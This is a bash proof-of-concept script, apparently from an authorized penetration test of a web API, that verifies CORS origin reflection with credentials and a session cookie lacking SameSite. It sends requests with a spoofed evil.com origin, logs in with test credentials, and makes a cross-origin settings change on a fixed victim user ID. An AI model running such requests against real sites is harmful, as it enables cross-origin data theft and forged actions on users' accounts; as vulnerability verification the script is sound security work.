#!/usr/bin/env bash
# a08-f01 + a02-f02: CORS origin reflection with credentials + SameSite-less session cookie.
# Demonstrates:
#   1. Server preflight accepts Origin: https://evil.com with credentials=true
#   2. A credentialed request from evil.com can read the response body (due to CORS reflection)
#   3. No CSRF token required — Bearer OR session cookie suffices
# Uses the pre-captured JWT (Bearer); the CORS reflection applies equally to session cookies
# once a victim is logged in (session cookie has no SameSite attribute).

set -uo pipefail
set -a; source /tmp/tokens.env; set +a
TARGET="${TARGET_URL:-http://localhost:3000}"

echo "=== a08-f01 + a02-f02: CSRF via SameSite-less session + CORS reflection ==="

echo "--- Step 1: OPTIONS preflight from evil.com reflects origin+credentials ---"
PRE=$(curl -si -X OPTIONS "$TARGET/api/auth/me" \
  -H 'Origin: https://evil.com' \
  -H 'Access-Control-Request-Method: GET' \
  -H 'Access-Control-Request-Headers: authorization,content-type')
ACAO=$(echo "$PRE" | grep -i '^access-control-allow-origin' | tr -d '\r')
ACAC=$(echo "$PRE" | grep -i '^access-control-allow-credentials' | tr -d '\r')
echo "  $ACAO"
echo "  $ACAC"

echo
echo "--- Step 2: credentialed cross-origin GET reads /api/auth/me ---"
RESP=$(curl -s -H "Authorization: Bearer $CLIENT" -H 'Origin: https://evil.com' "$TARGET/api/auth/me")
echo "  /api/auth/me body (from evil.com origin): $(echo "$RESP" | head -c 200)"
ACAO2=$(curl -si -H "Authorization: Bearer $CLIENT" -H 'Origin: https://evil.com' "$TARGET/api/auth/me" \
  | grep -i '^access-control-allow-origin' | tr -d '\r')
echo "  Response ACAO: $ACAO2"

echo
echo "--- Step 3: confirm session cookie has NO SameSite attribute ---"
# Use freelancer (known-good password) to obtain a session cookie
SC=$(curl -si -X POST "$TARGET/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"pentester_free_1@test.com","password":"TestPass123!"}' \
  | grep -i '^set-cookie' | tr -d '\r' | head -1)
echo "  $SC"
if echo "$SC" | grep -qi 'samesite'; then
  SS="PRESENT"
else
  SS="ABSENT"
fi
echo "  SameSite attribute: $SS"

echo
echo "--- Step 4: cross-origin state change — PUT /api/users/:id/settings ---"
# Use Bearer (authenticate middleware accepts either), Origin: evil.com
VICTIM_ID="ec83b101-7215-4ad3-962c-18dc6d6c4c54"
MUT=$(curl -s -X PUT "$TARGET/api/users/$VICTIM_ID/settings" \
  -H "Authorization: Bearer $CLIENT" \
  -H 'Origin: https://evil.com' \
  -H 'Content-Type: application/json' \
  -d '{"timezone":"CSRF_TEST_PAYLOAD_evil"}')
echo "  PUT response: $(echo "$MUT" | head -c 250)"

echo
echo "=== VERDICT ==="
OK=0
echo "$ACAO" | grep -qi 'evil.com' && ((OK++)) && echo "  [+] CORS origin reflected"
echo "$ACAC" | grep -qi 'true' && ((OK++)) && echo "  [+] credentials=true permitted"
echo "$ACAO2" | grep -qi 'evil.com' && ((OK++)) && echo "  [+] actual response also carries ACAO=evil.com"
[[ "$SS" = "ABSENT" ]] && ((OK++)) && echo "  [+] session cookie has NO SameSite"
echo "$MUT" | grep -qi 'CSRF_TEST_PAYLOAD_evil' && ((OK++)) && echo "  [+] cross-origin state change succeeded"
if (( OK >= 4 )); then
  echo "PASS: $OK/5 preconditions proven — CSRF + cross-origin read both viable from any origin."
  exit 0
else
  echo "FAIL: $OK/5"
  exit 1
fi
